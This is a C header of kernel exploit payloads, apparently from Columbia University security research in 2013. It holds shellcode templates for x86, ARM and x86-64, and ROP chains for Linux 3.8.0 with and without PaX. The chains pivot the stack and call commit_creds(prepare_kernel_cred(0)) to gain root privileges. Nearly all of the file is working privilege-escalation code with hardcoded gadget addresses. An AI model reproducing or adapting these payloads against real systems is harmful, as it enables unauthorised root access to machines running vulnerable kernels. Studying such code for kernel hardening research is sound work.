/*
 * Copyright (c) 2013, Columbia University
 * All rights reserved.
 *
 * This software was developed by Vasileios P. Kemerlis <vpk@cs.columbia.edu>
 * at Columbia University, New York, NY, USA, in March 2013.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *   * Neither the name of Columbia University nor the
 *     names of its contributors may be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#ifndef	__SHELLCODE_H__
#define	__SHELLCODE_H__

/* shellcode template */
#if	defined(__i386__)	/* x86 */
#define SHELL_PREFIX	5		/* 5 bytes of "prefix" code */
#define SHELL_SUFFIX	12		/* 12 bytes of "suffix" code */
#define	SHELL_ADV	1		/* 1 byte of code advancement */
static char shell_tmpl[] =
		"\x55"			/* push	%ebp		*/
		"\x89\xe5"		/* mov	%esp, %ebp	*/
		"\x53"			/* push	%ebx		*/
		"\xbb"			/* mov	$<kaddr>, %ebx	*/
		"\xba"			/* mov	$<kaddr>, %edx	*/
		"\xb8\x00\x00\x00\x00"	/* mov	$0x0, %eax	*/
		"\xff\xd2"		/* call	*%edx		*/
		"\xff\xd3"		/* call	*%ebx		*/
		"\x5b"			/* pop	%ebx		*/
		"\x5d"			/* pop	%ebp		*/
		"\xc3";			/* ret			*/
#if	defined(__PAX__)
/* 3.8.0-pax */
					/* scratch space 	*/
#define	SAVE_ESP_OFF	8
#define SAVE_EBP_OFF	24
#define	REST_EBP_OFF	52
#define	REST_ESP_OFF	68
#define USTACK_SZ	1024
#define	ROP_SZ		79		/* size of the payload	*/
#define	STACK_PIVOT	0xec58		/* xchg %eax, %esp # ret*/
static char rop_tmpl[] =
		/* pop the tampered-with data structure		*/
		"\x03\xaa\x0f\x00"	/* pop %ecx        # ret*/
		/* pivot to scratch space and save CPU sate 	*/
					/* pivot+save orig. esp	*/
		"\x03\xaa\x0f\x00"	/* pop %ecx        # ret*/
		"\x00\x00\x00\x00"
		"\xa7\xda\x5e\x00"	/* mov %eax, (%ecx)# ret*/
					/* pivot+save orig. ebp	*/
		"\xf6\xea\x01\x00"	/* xchg %eax, %ebp # ret*/
		"\x03\xaa\x0f\x00"	/* pop %ecx        # ret*/
		"\x00\x00\x00\x00"
		"\xa7\xda\x5e\x00"	/* mov %eax, (%ecx)# ret*/
					/* w00t 		*/
		/* w00t; commit_creds(prepare_kernel_cred(0)	*/
		"\xf4\xd7\x19\x00"	/* pop %eax        # ret*/
		"\x00\x00\x00\x00"
		"\x60\x5c\x06\x00"	/* `prepare_kernel_cred'*/
		"\xc0\x59\x06\x00"	/* `commit_creds'	*/
		/* restore the saved CPU state			*/
		"\xf4\xd7\x19\x00"	/* pop %eax        # ret*/
		"\x00\x00\x00\x00"
		"\x21\x82\x02\x00"	/* mov (%eax), %eax# ret*/
		"\xf6\xea\x01\x00"	/* xchg %eax, %ebp # ret*/
		"\xf4\xd7\x19\x00"	/* pop %eax        # ret*/
		"\x00\x00\x00\x00"
		"\x21\x82\x02\x00"	/* mov (%eax), %eax# ret*/
		"\x58\xec\x00\x00";	/* xchg %eax, %esp # ret*/
#else
/* 3.8.0 */
#define	SAVE_ESP_OFF	8
#define SAVE_EBP_OFF	24
#define	REST_EBP_OFF	52
#define	REST_ESP_OFF	68
#define USTACK_SZ	1024
#define	ROP_SZ		79		/* size of the payload	*/
#define	STACK_PIVOT	0xc100a7f9	/* xchg %eax, %esp # ret*/
static char rop_tmpl[] =
		/* pop the tampered-with data structure		*/
		"\x59\xd3\x0e\xc1"	/* pop %edx        # ret*/
		/* pivot to scratch space and save CPU sate 	*/
					/* pivot+save orig. esp	*/
		"\x59\xd3\x0e\xc1"	/* pop %edx        # ret*/
		"\x00\x00\x00\x00"
		"\x7f\x54\x27\xc1"	/* mov %eax, (%edx)# ret*/
					/* pivot+save orig. ebp	*/
		"\xd5\x09\x03\xc1"	/* xchg %eax, %ebp # ret*/
		"\x59\xd3\x0e\xc1"	/* pop %edx        # ret*/
		"\x00\x00\x00\x00"
		"\x7f\x54\x27\xc1"	/* mov %eax, (%edx)# ret*/
					/* w00t 		*/
		/* w00t; commit_creds(prepare_kernel_cred(0)	*/
		"\x94\x88\x25\xc1"	/* pop %eax        # ret*/
		"\x00\x00\x00\x00"
		"\xe0\x35\x07\xc1"	/* `prepare_kernel_cred'*/
		"\x40\x33\x07\xc1"	/* `commit_creds'	*/
		/* restore the saved CPU state			*/
		"\x94\x88\x25\xc1"	/* pop %eax        # ret*/
		"\x00\x00\x00\x00"
		"\x51\x65\x03\xc1"	/* mov (%eax), %eax# ret*/
		"\xd5\x09\x03\xc1"	/* xchg %eax, %ebp # ret*/
		"\x94\x88\x25\xc1"	/* pop %eax        # ret*/
		"\x00\x00\x00\x00"
		"\x51\x65\x03\xc1"	/* mov (%eax), %eax# ret*/
		"\xf9\xa7\x00\xc1";	/* xchg %eax, %esp # ret*/
#endif
#elif	defined(__arm__)	/* ARM */
#define SHELL_PREFIX	28		/* 28 bytes of "prefix" code */
#define SHELL_SUFFIX	0		/* 0 bytes of "suffix" code */
#define	SHELL_ADV	0		/* 0 byte of code advancement */
static char shell_tmpl[] =
		"\x08\x40\x2d\xe9"	/* push	{r3, lr}	*/
		"\x00\x00\xa0\xe3"	/* mov	r0, #0		*/
		"\x10\x10\x9f\xe5"	/* ldr	r1, [pc, #16]	*/
		"\x31\xff\x2f\xe1"	/* blx	r1		*/
		"\x08\x40\xbd\xe8"	/* pop	{r3, lr}	*/
		"\x00\x10\x9f\xe5"	/* ldr	r1, [pc, #0]	*/
		"\x11\xff\x2f\xe1"	/* bx	r1		*/
		"\x00\x00\x00\x00"	/* <kaddr>		*/
		"\x00\x00\x00\x00";	/* <kaddr>		*/
#elif	defined(__x86_64__)	/* x86-64 */
#define SHELL_PREFIX	8		/* 8 bytes of "prefix" code */
#define SHELL_SUFFIX	24		/* 24 bytes of "suffix" code */
#define	SHELL_ADV	3		/* 3 bytes of code advancement */
static char shell_tmpl[] =
		"\x55"			/* push	%rbp		*/
		"\x48\x89\xe5"		/* mov	%rsp, %rbp	*/
		"\x53"			/* push	%rbx		*/
		"\x48\xc7\xc3"		/* mov	$<kaddr>, %rbx	*/
		"\x48\xc7\xc0"		/* mov	$<kaddr>, %rax	*/
	"\x48\xc7\xc7\x00\x00\x00\x00"	/* mov	$0x0, %rdi	*/
		"\xff\xd0"		/* callq *%rax		*/
		"\x48\x89\xc7"		/* mov	%rax, %rdi	*/
		"\xff\xd3"		/* callq *%rbx		*/
	"\x48\xc7\xc0\x00\x00\x00\x00"	/* mov	$0x0, %rax	*/
		"\x5b"			/* pop	%rbx		*/
		"\xc9"			/* leaveq		*/
		"\xc3";			/* ret			*/
#endif

#endif 	/* __SHELLCODE_H__ */
